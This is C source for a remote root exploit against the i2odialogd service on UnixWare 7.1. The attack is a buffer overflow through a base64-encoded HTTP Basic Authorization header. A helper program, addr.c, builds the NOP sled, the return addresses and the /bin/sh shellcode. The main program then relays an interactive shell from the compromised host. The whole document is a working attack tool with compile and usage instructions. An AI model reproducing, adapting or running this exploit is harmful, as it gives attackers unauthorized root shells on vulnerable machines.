/* uwi2.c
 *
 * i2o remote root exploit for UnixWare 7.1
 * compile on UnixWare with cc -o uwi2 uwi2.c -lsocket -lnsl
 * ./uwi2 <hostname> =

 * The hard-coded RET address is 0x8047d4c =

 *
 * To either replace the shellcode or change the offset you must =

 * first craft a program which outputs, in this order:
 * - 92 bytes of your RET address (EIP starts at 89)
 * - NOPs, as many as you would like
 * - your shellcode
 * - the character ":"
 * - any character, maybe "A", as I've done below
 * - NULL
 * When printf()'ing this string, do NOT append a \newline!
 * You then pipe the output of this program to a MIME encoder (mimencode =

 * on UnixWare).  You then take the output of this program and paste it
 * where I've marked below.
 *
 * Brock Tellier btellier@usa.net
 *
*/

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/errno.h>
#include <netdb.h>

#define BUFLEN 10000

/* since we're overflowing an Authenticate: Basic username */
/* our exploit code must be base64(MIME) encoded */

char *mimecode =


/**** CHANGE THIS PART OF THE EXPLOIT STRING ****/
"kJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQ=
"
"kJCQkJCQTH0ECEx9BAhMfQQITH0ECEx9BAhMfQQITH0ECEx9BAhMfQQITH0ECJCQkJCQkJCQ=
"
"kJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQ=
"
"kJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQ=
"
"kJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQ=
"
"kJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQ6xteMduJXgeJXgyIXhExwLA7jX4HiflT=
"
"UVZW6xDo4P///y9iaW4vc2iqqqqqmqqqqqoHqpCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQ=
"
"kJCQkJCQkJCQkJCQkJCQkJCQkDpB";
/************************************************/

char *auth=
"GET / HTTP/1.0\r\n"
"Host: localhost:360\r\n"
"Accept: text/html\r\n"
"Accept-Encoding: gzip, compress\r\n"
"Accept-Language: en\r\n"
"Negotiate: trans\r\n"
"User-Agent: xnec\r\n"
"Authorization: Basic";

char buf[BUFLEN];
char sockbuf[BUFLEN];
char c;
int offset=0;
int i, ascii,num;
int i2oport = 360;
int sock;
int addr = 0x80474b4;
struct  sockaddr_in sock_a;
struct  hostent *host;

void main (int argc, char *argv[]) {
        =

 if(argc < 2) {
   fprintf(stderr, "Error:Usage: %s <hostname> \n", argv[0]);
   exit(0);
  }
 if(argc == 3) offset=atoi(argv[2]);
 =

 sprintf(buf, "%s %s \r\n\r\n", auth, mimecode);
 buf[BUFLEN - 1] = 0;

 fprintf(stderr, "i2odialogd remote exploit for UnixWare 7.1\n");
 fprintf(stderr, "Brock Tellier btellier@usa.net\n");

 if((host=(struct hostent *)gethostbyname(argv[1])) == NULL) {
    perror("gethostbyname"); =

    exit(-1);
  }
 =

 if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))<0) {
    perror("create socket");
    exit(-1);
  }

 sock_a.sin_family=AF_INET;
 sock_a.sin_port=htons(i2oport);
 memcpy((char *)&sock_a.sin_addr,(char *)host->h_addr,host->h_length);
 if(connect(sock,(struct sockaddr *)&sock_a,sizeof(sock_a))!=0) {
    perror("create connect");
    exit(-1);
  }

  fflush(stdout);

  // write exploit
  write(sock,buf,strlen(buf));

  //begin read
  while(1) {
    fd_set input;
    FD_SET(0,&input);
    FD_SET(sock,&input);
    select(sock+1,&input,NULL,NULL,NULL);

    if(FD_ISSET(sock,&input)) {
      num=read(sock,sockbuf,BUFLEN);
      write(1,sockbuf,num);
     }
     if(FD_ISSET(0,&input))
     write(sock,sockbuf,read(0,sockbuf,BUFLEN));
  }
}

------

--- addr.c ---

/* =

 * addr.c - Add-on for the UnixWare 7.1 remote root exploit in i2dialogd
 * simply MIME encode the output of this program and put into the =

 * appropriate place in uwi2.c
 * =

 * Usage: cc -o addr addr.c; ./addr <offset> <size>
 *
 * Brock Tellier btellier@usa.net
*/

#include <stdio.h>
#define NOP 0x90

char scoshell[]= =

"\xeb\x1b\x5e\x31\xdb\x89\x5e\x07\x89\x5e\x0c\x88\x5e\x11\x31\xc0"
"\xb0\x3b\x8d\x7e\x07\x89\xf9\x53\x51\x56\x56\xeb\x10\xe8\xe0\xff"
"\xff\xff/bin/sh\xaa\xaa\xaa\xaa\x9a\xaa\xaa\xaa\xaa\x07\xaa";

void main(int argc, char *argv[]) {

long addr;
char buf[2000];
int i;
int offset;
int size = 400;

if (argc > 1) offset = atoi(argv[1]);
if (argc > 2) size = atoi(argv[2]);

addr=0x8046000 + offset;
memset(buf, NOP, size);
for(i=60;i<100;i+=4)*(int *)&buf[i]=addr;
for(i = 0; i < strlen(scoshell); i++)
   buf[i+300] = scoshell[i];
buf[size - 3] = ':'; =

buf[size - 2] = 'A';
buf[size - 1] = 0;
fprintf(stderr, "using addr 0x%x with offset %d \n", addr, offset);
fprintf(stderr, "mime-encode the stdoutput!\n");
printf(buf);

}

